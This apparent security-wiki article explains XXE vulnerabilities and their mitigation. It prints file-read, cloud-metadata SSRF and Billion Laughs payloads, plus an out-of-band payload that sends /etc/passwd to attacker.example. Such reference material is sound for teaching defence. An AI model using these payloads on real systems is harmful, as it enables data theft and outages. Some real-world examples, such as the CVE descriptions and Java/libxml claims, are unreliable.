---
title: XML External Entity
slug: xxe
category: attacks
summary: XML External Entity (XXE) is a web vulnerability class where an XML parser accepting external entity declarations can be tricked into reading arbitrary files, making outbound network requests, or causing denial of service via recursive entity expansion.
related: [sql-injection, ssrf, cross-site-scripting, owasp-top-10, burp-suite]
aliases: [XXE, XML External Entity Attack, XEE]
updated: 2026-05-25
---

**XML External Entity** (XXE) is a web vulnerability class where an XML parser configured to resolve external entity declarations can be exploited to read arbitrary files from the server, make outbound HTTP requests on the server's behalf ([Server-Side Request Forgery](/wiki/ssrf)), or cause denial-of-service via recursive entity expansion.

XXE was a top-three OWASP web vulnerability in the 2017 [Top 10](/wiki/owasp-top-10) but fell out of the 2021 list as modern XML parsers shipped with external entities disabled by default. The vulnerability persists in:

- Legacy Java applications (where libxml's `disable_external_entities` was not the default before recent versions).
- File-format conversion tools (`docx`, `xlsx`, `svg` — all XML under the hood).
- SAML implementations.
- SOAP services in older enterprise environments.

## The classic file-read payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

The XML parser:

1. Sees a DOCTYPE block declaring an entity `xxe`.
2. Resolves the `SYSTEM` URL — fetches `file:///etc/passwd` from the local filesystem.
3. Substitutes the file contents into `&xxe;` references in the document.
4. The application processes the resulting document and (if it echoes user data back) returns `/etc/passwd` to the attacker.

On Windows the equivalent path is `file:///C:/Windows/win.ini`.

## XXE → SSRF

When the entity URL is a network URL, the parser makes an HTTP request:

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

The parser performs a `GET` on `169.254.169.254` — the AWS instance metadata endpoint. The response substitutes into the document. This is XXE escalating to [SSRF](/wiki/ssrf) → cloud credentials.

Combined with the file-read primitive, XXE often becomes the entry point for the same chain that pure SSRF does.

## Blind XXE — when output isn't echoed

Many real-world targets don't echo the parsed XML back to the user. The attacker doesn't see `/etc/passwd` directly. The workaround is **out-of-band XXE** — chain to an attacker-controlled DNS or HTTP listener:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.example/evil.dtd">
  %dtd;
]>
<foo>&send;</foo>
```

The attacker hosts `evil.dtd`:

```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.example/?d=%file;'>">
%all;
```

The parser:

1. Reads the file at `/etc/passwd` into `%file`.
2. Fetches `evil.dtd`, evaluates the nested entity.
3. Makes a request to `http://attacker.example/?d=<contents of /etc/passwd>`.
4. Attacker reads the data from their server logs.

[Burp Collaborator](/wiki/burp-suite) is the canonical tool for this — it generates a unique subdomain that captures the callback.

## Billion Laughs (DoS variant)

A recursive entity expansion that consumes exponential memory:

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!-- ... up to lol9 -->
]>
<lolz>&lol9;</lolz>
```

`&lol9;` expands to 1 billion `lol` strings — gigabytes of memory. Modern parsers ship limits (`expat`'s entity-expansion limit, libxml's `XML_PARSE_HUGE`) but it's worth confirming on legacy stacks.

## Where XXE lands today

The vulnerable patterns:

1. **File upload features** that parse the upload as XML. Office formats (`.docx`, `.xlsx`, `.pptx`), SVG, KML, RSS feeds, OPML, plist (iOS), TestRail XML imports.

2. **SOAP / WSDL services.** Older enterprise SOAP stacks default to external-entity-enabled parsers.

3. **PDF generators.** Many PDF libraries (especially Java-based) consume XML/XSLT inputs and can be poisoned.

4. **SAML implementations.** A surprisingly common bug — auth flows that parse user-supplied SAML responses with unsafe defaults.

5. **Legacy XML APIs.** Anything written against XML before ~2018 that hasn't been audited.

## Detection

- **[Burp Suite](/wiki/burp-suite)** sends standard XXE payloads against every XML-accepting endpoint. The Pro Scanner catches most file-read-with-echo cases.
- **Burp Collaborator** for blind XXE — inject the unique Collaborator subdomain, watch for the parser's callback.
- **Manual review** is the right call for non-obvious XML surfaces — file upload validators, internal services that consume third-party XML. Look for `DocumentBuilderFactory`, `XMLReader`, `lxml`, `Nokogiri`, etc. without explicit secure-config calls.

## Mitigation

The single line of defense per language:

| Language / library | The fix |
|---|---|
| **Java DocumentBuilderFactory** | `dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);` |
| **Java SAXParserFactory** | Same `disallow-doctype-decl` feature. |
| **Python lxml** | `etree.XMLParser(resolve_entities=False, no_network=True)` |
| **Python xml.etree** | Safe by default in modern Python (3.7+); legacy versions need `defusedxml`. |
| **PHP libxml** | `libxml_disable_entity_loader(true)` (deprecated in PHP 8) or use `libxml_set_external_entity_loader(NULL)`. |
| **.NET XmlReader / XmlDocument** | `XmlReaderSettings { DtdProcessing = DtdProcessing.Prohibit }` |
| **Ruby Nokogiri** | `Nokogiri::XML.parse(input) { |config| config.nonet }` |

Equally important: **prefer JSON.** If the API doesn't have to accept XML, don't. JSON has no equivalent to entity expansion and is structurally simpler.

When XML *is* required, use the language's safe-defaults parser explicitly. Don't construct XmlReader settings from scratch — start from a known-safe wrapper library (`defusedxml` in Python, OWASP's recommended Java patterns).

## Real-world examples

- **Facebook XXE bug bounty (2014)** — discovered by Reginaldo Silva, paid $33,500. Read arbitrary files from Facebook's servers via OpenID file-upload flow.
- **CVE-2021-21345 (XStream Java library)** — XXE in deserialization path; chained to RCE.
- **CVE-2022-22965 (Spring4Shell follow-up)** — related XML-binding bug class.

## Further reading

- [PortSwigger Web Security Academy: XXE](https://portswigger.net/web-security/xxe) — interactive labs.
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html).
- [defusedxml (Python)](https://pypi.org/project/defusedxml/).
